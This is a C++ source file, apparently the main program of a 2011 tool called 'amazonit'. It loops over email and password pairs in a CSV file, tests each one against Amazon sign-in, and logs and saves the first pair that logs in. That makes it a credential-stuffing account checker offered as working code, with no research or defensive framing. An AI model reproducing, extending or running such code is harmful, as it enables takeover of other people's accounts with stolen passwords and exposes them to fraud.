/**
 * cluries @ 2011
 * http://cdbit.com
 */      

#include "config.h"
#include "clloger.h"
#include "amazonit.h"
#include "filemanager.h"

#include <pcre.h>


int main()
{
	/*
	if(setuid(0)){
		LOG_ERROR("setuid error :%s", strerror(errno));
	}

	if(setgid(0)) {
		LOG_ERROR("setgid error :%s", strerror(errno));
	}*/

	using namespace amazon;
	
	char source[512]; prunpath(source,512,"/source/source.csv");
	char target[512]; prunpath(target,512,"/target/target.csv");
	char offset[512]; prunpath(offset,512,"/config/offset.ini");
	
	FileManager fileManager(source,target,offset,kFileManagerTargetModeAppend)	;
	
	//Amazonit 	amazonit   	;
	//amazonit.measurement()	;
	/*
	// test
	Amazonit 	amazonit   	;
	AmazonAccount account	;
 
	amazonit.validate(&account);
	*/

  
	bool finded = false;
	while(fileManager.next() ) {		
		Amazonit 	amazonit   	;
		if (amazonit.validate(fileManager.fetch())>0) {
			finded = true;
			LOG_INFO("**************************YES! %s - %s can use for sigin amazon\n", fileManager.fetch()->email,fileManager.fetch()->password );
			fileManager.putTarget();
			break;
		}
		
	}

	if (!finded) {
		LOG_I("sorry,but not any user-password pairs can sigin amazon\n");
	}
	

	return 0;
}

